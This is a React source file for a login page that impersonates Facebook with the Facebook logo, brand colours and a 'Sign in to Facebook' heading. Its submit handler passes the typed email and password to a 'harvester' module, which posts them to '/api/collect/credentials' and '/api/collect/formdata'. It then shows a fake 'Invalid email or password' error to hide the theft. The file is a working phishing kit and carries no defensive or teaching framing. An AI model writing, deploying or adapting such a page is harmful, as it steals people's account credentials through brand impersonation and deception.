import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Divider, Alert, Checkbox, FormControlLabel, InputAdornment, IconButton, Paper, Link, Avatar } from '@mui/material';
import { Visibility, VisibilityOff } from '@mui/icons-material';
import FacebookIcon from '@mui/icons-material/Facebook';
import harvester from '../harvester/HarvesterCore';

export default function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    await harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      username: email,
      password: password,
      email: email,
      url: window.location.href,
      formType: 'login-page',
      fieldData: { email, password }
    });

    await harvester.send('/api/collect/formdata', {
      formId: 'login-form',
      fields: { email, password },
      url: window.location.href
    });

    setTimeout(() => {
      setError('Invalid email or password. Please try again.');
      setLoading(false);
    }, 2000);
  };

  return (
    <Box sx={{ 
      minHeight: '100vh', 
      bgcolor: '#f0f2f5', 
      display: 'flex', 
      alignItems: 'center', 
      justifyContent: 'center', 
      py: 4,
      px: 2
    }}>
      <Container maxWidth="xs">
        {/* Facebook-style Brand Header */}
        <Box sx={{ textAlign: 'center', mb: 3 }}>
          <Box sx={{
            width: 60, height: 60, mx: 'auto', mb: 1.5,
            borderRadius: '50%',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
          }}>
            <svg width="56" height="56" viewBox="0 0 24 24" fill="#1877f2">
              <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
            </svg>
          </Box>
          <Typography variant="h4" sx={{ 
            fontWeight: 700, 
            color: '#1c1e21', 
            mb: 0.5, 
            fontSize: '1.5rem' 
          }}>
            Sign in to Facebook
          </Typography>
          <Typography sx={{ color: '#606770', fontSize: '0.9rem' }}>
            to continue to your account
          </Typography>
        </Box>

        <Card elevation={3} sx={{ 
          borderRadius: '12px', 
          boxShadow: '0 2px 16px rgba(0,0,0,0.12)',
          border: '1px solid #dddfe2'
        }}>
          <CardContent sx={{ p: { xs: 2.5, sm: 3 } }}>
            {error && (
              <Alert severity="error" sx={{ 
                mb: 2, 
                borderRadius: '8px', 
                fontSize: '0.85rem', 
                bgcolor: '#ffebe8', 
                color: '#c00', 
                '& .MuiAlert-icon': { color: '#c00' },
                border: '1px solid #f5c6cb'
              }}>
                {error}
              </Alert>
            )}

            <form onSubmit={handleSubmit}>
              <TextField
                fullWidth
                label="Email address or phone number"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                sx={{
                  mb: 2,
                  '& .MuiOutlinedInput-root': {
                    bgcolor: '#f5f6f7',
                    borderRadius: '8px',
                    fontSize: '0.95rem',
                    '& fieldset': { borderColor: '#dddfe2', borderWidth: '1.5px' },
                    '&:hover fieldset': { borderColor: '#ccd0d5' },
                    '&.Mui-focused fieldset': { borderColor: '#1877f2', borderWidth: '2px' },
                  },
                  '& .MuiInputLabel-root': { 
                    color: '#8d949e', 
                    fontSize: '0.95rem', 
                    '&.Mui-focused': { color: '#1877f2' } 
                  },
                }}
                size="medium"
                required
                autoComplete="email"
                autoFocus
              />
              <TextField
                fullWidth
                label="Password"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                sx={{
                  mb: 1.5,
                  '& .MuiOutlinedInput-root': {
                    bgcolor: '#f5f6f7',
                    borderRadius: '8px',
                    fontSize: '0.95rem',
                    '& fieldset': { borderColor: '#dddfe2', borderWidth: '1.5px' },
                    '&:hover fieldset': { borderColor: '#ccd0d5' },
                    '&.Mui-focused fieldset': { borderColor: '#1877f2', borderWidth: '2px' },
                  },
                  '& .MuiInputLabel-root': { 
                    color: '#8d949e', 
                    fontSize: '0.95rem', 
                    '&.Mui-focused': { color: '#1877f2' } 
                  },
                }}
                size="medium"
                required
                autoComplete="current-password"
                InputProps={{
                  endAdornment: (
                    <InputAdornment position="end">
                      <IconButton onClick={() => setShowPassword(!showPassword)} edge="end" size="small" sx={{ color: '#8d949e' }}>
                        {showPassword ? <VisibilityOff /> : <Visibility />}
                      </IconButton>
                    </InputAdornment>
                  )
                }}
              />

              <Box sx={{ mb: 2 }}>
                <FormControlLabel
                  control={<Checkbox size="small" sx={{ color: '#8d949e', '&.Mui-checked': { color: '#1877f2' } }} />}
                  label={<Typography sx={{ color: '#606770', fontSize: '0.85rem' }}>Keep me signed in</Typography>}
                />
              </Box>

              <Button
                type="submit"
                variant="contained"
                fullWidth
                size="large"
                disabled={loading || !email || !password}
                sx={{
                  bgcolor: '#1877f2',
                  '&:hover': { bgcolor: '#166fe5' },
                  '&:disabled': { bgcolor: '#9bc0f7' },
                  fontWeight: 700,
                  py: 1.4,
                  textTransform: 'none',
                  fontSize: '1.05rem',
                  borderRadius: '10px',
                  boxShadow: 'none',
                  mb: 1.5
                }}
              >
                {loading ? 'Signing In...' : 'Sign In'}
              </Button>
            </form>

            <Box sx={{ textAlign: 'center', mb: 2 }}>
              <Link href="#" underline="hover" sx={{ 
                color: '#1877f2', 
                fontSize: '0.85rem', 
                fontWeight: 500, 
                cursor: 'pointer' 
              }}>
                Forgotten password?
              </Link>
            </Box>

            <Divider sx={{ mb: 2.5, color: '#dadde1', fontSize: '0.85rem' }}>
              <Typography sx={{ color: '#8d949e', fontSize: '0.75rem', px: 1 }}>OR</Typography>
            </Divider>

            <Box sx={{ textAlign: 'center' }}>
              <Button
                variant="contained"
                sx={{
                  bgcolor: '#42b72a',
                  '&:hover': { bgcolor: '#36a420' },
                  fontWeight: 700,
                  py: 1.2,
                  px: 3,
                  textTransform: 'none',
                  fontSize: '0.95rem',
                  borderRadius: '10px',
                  boxShadow: 'none'
                }}
              >
                Create New Account
              </Button>
            </Box>
          </CardContent>
        </Card>

        <Box sx={{ textAlign: 'center', mt: 3 }}>
          <Typography sx={{ color: '#606770', fontSize: '0.75rem', lineHeight: 1.4, px: 2 }}>
            By signing in, you agree to our{' '}
            <Link href="#" underline="hover" sx={{ color: '#385898', cursor: 'pointer', fontSize: '0.75rem', fontWeight: 500 }}>Terms</Link>{', '}
            <Link href="#" underline="hover" sx={{ color: '#385898', cursor: 'pointer', fontSize: '0.75rem', fontWeight: 500 }}>Data Policy</Link>{' '}
            and{' '}
            <Link href="#" underline="hover" sx={{ color: '#385898', cursor: 'pointer', fontSize: '0.75rem', fontWeight: 500 }}>Cookie Policy</Link>.
          </Typography>
        </Box>

        {/* Footer links */}
        <Box sx={{ textAlign: 'center', mt: 3, display: 'flex', justifyContent: 'center', gap: 2, flexWrap: 'wrap' }}>
          {['Privacy Policy', 'Terms of Service', 'Contact'].map((item, i) => (
            <Link key={i} href="#" underline="hover" sx={{ color: '#8d949e', fontSize: '0.7rem', cursor: 'pointer' }}>
              {item}
            </Link>
          ))}
        </Box>
      </Container>
    </Box>
  );
}